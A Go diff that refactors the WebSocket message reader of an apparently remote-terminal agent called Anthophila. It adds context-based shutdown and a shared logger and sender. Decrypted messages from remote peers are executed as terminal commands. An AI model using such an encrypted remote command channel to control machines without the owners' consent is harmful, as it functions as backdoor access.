@@ -3,6 +3,8 @@ package management
 import (
 	"Anthophila/information"
 	"Anthophila/logging"
+
+	"context"
 	"encoding/json"
 	"fmt"
 	"strings"
@@ -13,22 +15,24 @@ import (
 
 // Reader - структура, яка забезпечує обробку отриманих повідомлень через WebSocket.
 type Reader struct {
-	LogStatus     bool              // Статус логування``
-	LogAddress    string            // Адреса для логування
+	Ctx           context.Context // для завершення Reader
+	Logger        *logging.LoggerService
 	Encryptor     *CryptoManager    // Менеджер шифрування для захисту даних
 	Terminal      TerminalInterface // Інтерфейс для роботи з терміналом
 	CurrentClient string            // Додається, щоб зберігати поточного клієнта для відповіді
 	cancelOutput  chan struct{}     // Канал для зупинки старої горутини
 	mu            sync.Mutex        // М'ютекс для потокобезпечного доступу
+	Sender        *Sender
 }
 
 // NewReader створює новий екземпляр `Reader` з параметрами
-func NewReader(logStatus bool, logAddress string, encryptor *CryptoManager, ws *websocket.Conn) *Reader {
+func NewReader(ctx context.Context, logger *logging.LoggerService, encryptor *CryptoManager, ws *websocket.Conn) *Reader {
 	r := &Reader{
-		LogStatus:    logStatus,
-		LogAddress:   logAddress,
+		Ctx:          ctx,
+		Logger:       logger,
 		Encryptor:    encryptor,
 		cancelOutput: make(chan struct{}),
+		Sender:       NewSender(ws, logger), // ← правильна змінна тут!,
 	}
 	r.initTerminal(ws)
 	return r
@@ -42,12 +46,10 @@ func (r *Reader) initTerminal(ws *websocket.Conn) {
 	}
 
 	// Ініціалізація нового TerminalHandler
-	handler := NewTerminalHandler(r.LogStatus, r.LogAddress, ws, r.Encryptor, &r.CurrentClient)
+	handler := NewTerminalHandler(r.Logger, ws, r.Encryptor, &r.CurrentClient, r.Sender)
 
 	if err := handler.Start(); err != nil {
-		if r.LogStatus {
-			logging.Log(r.LogAddress, "Failed to start terminal: ", err.Error())
-		}
+		r.Logger.Log("Failed to start terminal: ", err.Error())
 		return
 	}
 
@@ -60,85 +62,82 @@ func (r *Reader) ReadMessage(ws *websocket.Conn) {
 	for {
 		_, message, err := ws.ReadMessage()
 		if err != nil {
-			logging.Log(r.LogAddress, "Error reading message: %v", err.Error())
+			r.Logger.Log("Error reading message: %v", err.Error())
 		}
-		logging.Log(r.LogAddress, "Received: ", string(message))
+		r.Logger.Log("Received: ", string(message))
 	}
 }
 
 // ReadMessageCommand читає повідомлення з командою, обробляє її та надсилає відповідь або передає в термінал
 func (r *Reader) ReadMessageCommand(wSocket *websocket.Conn) {
 	for {
-		_, message, err := wSocket.ReadMessage()
-		if err != nil {
-			if r.LogStatus {
-				logging.Log(r.LogAddress, "Error reading message: ", err.Error())
+		select {
+		case <-r.Ctx.Done(): //знищуємо горутину якщо в нас викликається Done() то ми повертаємо  return нічого тим самим знищуємо горутину
+			r.Logger.Log("Reader: context cancelled, shutting down", " not connected")
+			r.Sender.Close()
+			if r.Terminal != nil {
+				r.Terminal.Stop()
 			}
 			return
-		}
-		// 1. Розшифрування
-		decrypted := r.Encryptor.DecryptText(string(message))
 
-		// 2. Перевірка, чи дійсно щось розшифрувалося
-		if decrypted == "" {
-			if r.LogStatus {
-				logging.Log(r.LogAddress, "Failed to decrypt message", string(message))
-			}
-			continue
-		}
-
-		// 3. Логування розшифрованого тексту
-		logging.Log(r.LogAddress, "Received decrypted message: ", decrypted)
-
-		// 4. Парсинг JSON
-		var cmd Message
-		if err := json.Unmarshal([]byte(decrypted), &cmd); err != nil {
-			if r.LogStatus {
-				logging.Log(r.LogAddress, "Failed to unmarshal decrypted JSON:", decrypted)
-			}
-			continue
-		}
-
-		r.mu.Lock()
-		r.CurrentClient = cmd.SClient
-		r.mu.Unlock()
-		logging.Log(r.LogAddress, "Received text Command: ", string(cmd.Message))
-
-		if cmd.Message == "help" {
-			fmt.Println("Available commands: help, restart, exit, terminal")
-			msg := Message{
-				SClient: information.NewInfo().GetMACAddress(),
-				RClient: cmd.SClient,
-				Message: "{\"terminal\":\"" + cmd.Message + "\"}",
-			}
-
-			jsonData, err := json.Marshal(msg)
+		default:
+			_, message, err := wSocket.ReadMessage()
 			if err != nil {
-				if r.LogStatus {
-					logging.Log(r.LogAddress, "Error marshalling JSON:", err.Error())
-				}
-				continue
+				r.Logger.Log("Error reading message: ", err.Error())
+				return
 			}
-			encrypted := r.Encryptor.EncryptText(string(jsonData))
-
-			if err := NewSender().sendMessageWith(r.LogAddress, wSocket, []byte(encrypted)); err != nil {
-				if r.LogStatus {
-					logging.Log(r.LogAddress, "Error sending encrypted message:", err.Error())
-				}
-			}
-
-		} else {
-			if strings.TrimSpace(cmd.Message) == "restart" || strings.TrimSpace(cmd.Message) == "exit" {
-				r.initTerminal(wSocket)
+			// 1. Розшифрування
+			decrypted := r.Encryptor.DecryptText(string(message))
+			// 2. Перевірка, чи дійсно щось розшифрувалося
+			if decrypted == "" {
+				r.Logger.Log("Failed to decrypt message", string(message))
 				continue
 			}
 
-			if r.Terminal != nil {
-				r.Terminal.SendCommand(cmd.Message)
-			} else if r.LogStatus {
-				logging.Log(r.LogAddress, "Terminal not initialized command ignored: ", cmd.Message)
+			// 3. Логування розшифрованого тексту
+			r.Logger.Log("Received decrypted message: ", decrypted)
+
+			// 4. Парсинг JSON
+			var cmd Message
+			if err := json.Unmarshal([]byte(decrypted), &cmd); err != nil {
+				r.Logger.Log("Failed to unmarshal decrypted JSON:", decrypted)
+				continue
 			}
 
+			r.mu.Lock()
+			r.CurrentClient = cmd.SClient
+			r.mu.Unlock()
+			r.Logger.Log("Received text Command: ", string(cmd.Message))
+
+			if cmd.Message == "help" {
+				fmt.Println("Available commands: help, restart, exit, terminal")
+				msg := Message{
+					SClient: information.NewInfo().GetMACAddress(),
+					RClient: cmd.SClient,
+					Message: "{\"terminal\":\"" + cmd.Message + "\"}",
+				}
+
+				jsonData, err := json.Marshal(msg)
+				if err != nil {
+					r.Logger.Log("Error marshalling JSON:", err.Error())
+					continue
+				}
+				encrypted := r.Encryptor.EncryptText(string(jsonData))
+
+				r.Sender.Send([]byte(encrypted))
+
+			} else {
+				if strings.TrimSpace(cmd.Message) == "restart" || strings.TrimSpace(cmd.Message) == "exit" {
+					r.initTerminal(wSocket)
+					continue
+				}
+
+				if r.Terminal != nil {
+					r.Terminal.SendCommand(cmd.Message)
+				} else {
+					r.Logger.Log("Terminal not initialized command ignored: ", cmd.Message)
+				}
+			}
 		}
 	}
 }
